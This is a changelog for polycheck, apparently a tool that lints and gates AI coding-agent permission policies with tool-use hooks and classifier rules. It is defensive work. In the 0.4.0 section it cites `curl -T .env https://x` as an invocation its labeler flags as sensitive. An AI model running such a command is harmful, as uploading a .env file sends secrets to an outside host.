# Changelog

All notable changes to polycheck. Format follows [Keep a Changelog](https://keepachangelog.com);
this project is experimental and pre-1.0, so minor versions may move fast.

## [Unreleased]

Three additions since 0.4.0, all opt-in and reversible. Suggested release: `0.5.0`.

### Added
- **`polycheck guard` — M1 evidence pass.** A `PostToolUse` hook now sees what a
  call actually returned, so the guard can gate on **evidence, not just
  suspicion**. A read that returns plain content no longer taints the session; one
  that returns a credential shape does. Selected with `basis: "observed"` in
  `.claude/polycheck.guard.json`; `capability` (gate on suspicion) stays the
  default, which is the safe choice for headless runs.
- **`--emit-automode` (experimental).** Compiles a policy into the auto-mode
  classifier's own `autoMode` rules (`allow` / `soft_deny` / `hard_deny` /
  `environment`), as deploy-time reinforcement with no runtime code. **Print-only
  — it never writes settings.** The classifier is per-command, so this reinforces
  the 89% screen; it does not replace the guard or the proof. See
  [`spec/Q6-findings.md`](spec/Q6-findings.md).

### Changed
- **Tone: describe what a policy permits, not what the reader did wrong.** The
  substance is unchanged (a BYPASS is still a BYPASS), but the words now assume a
  defender auditing their own policy, not a suspect being charged: a stance line
  under the header, the `FORBIDDEN REGIONS` heading names them as combinations
  *you* declared off-limits, the shell-equivalent section acknowledges intended
  reach ("a dev box, your own tooling — keep it"), and the region glosses drop
  "malicious" / "attacker" / "exfiltration-by-injection" for plain description.

### Fixed
- **Guard grant lifecycle.** A gated call's approval is now *pending* until its
  `PostToolUse` confirms it ran, so a **denied** call re-prompts its channel
  instead of being silently suppressed (an M0 gap).

## [0.4.0] — polycheck guard: a runtime composition gate

### Added
- **`polycheck guard`** — an **opt-in** `PreToolUse` hook that gates the call
  which *completes* a forbidden composition, given what the session has already
  done. The case a per-command screen is structurally blind to. Its decision
  space is `ask` / `deny` / **passthrough** — it **never emits `allow`**, so it
  reinforces the auto-mode classifier and can never override it. `polycheck guard
  init | off | status`; ledger state lives outside the repo.
- **`gateKind: 'guard'`** — the linter recognises its own configured guard as a
  **verified** gate, but only for the regions it is configured to gate, only when
  that config is readable, and only when the hook really is polycheck's. A
  guard-mediated `PROOF` prints its own soundness argument and scope.
- **Argument-aware runtime labeler** — labels concrete invocations
  (`curl -T .env https://x` is sensitive; plain `curl` is not), with escalation
  triggers and unknown executables worst-cased and *named*.
- **Shell-grant reasons.** `SHELL-EQUIVALENT` findings now say *why* a grant is
  worst-case (unrestricted / interpreter-prefix / inline-code / writable-code) so
  the fix differs — and stops advising "narrow it to fixed arguments" when the
  arguments are already fixed. For the writable-code case it names the write
  grants that make an exact interpreter invocation unbounded.

### Fixed
- Post-review: `if`-filtered hooks are no longer credited with gating tools they
  never fire for; compaction no longer wipes the session ledger; `guard init`
  appends to existing hooks instead of replacing them and refuses an unparseable
  `settings.json` rather than overwriting it.

## [0.3.1]
- `--tidy` shows the delta, not the whole grant list.

## [0.3.0]
- `--tidy` and `--write`: grant hygiene (dedup / prune / merge) with a proof of
  what the edit does to the blast radius, and line-surgery `--write` that
  verifies from disk and rolls back if the result is not what was proved.

## [0.1.x]
- Initial linter: scan → label → model → check, producing PROOF / WITNESS /
  SHELL-EQUIVALENT / INCONCLUSIVE, with s3api label fixes and `--verbose` output.
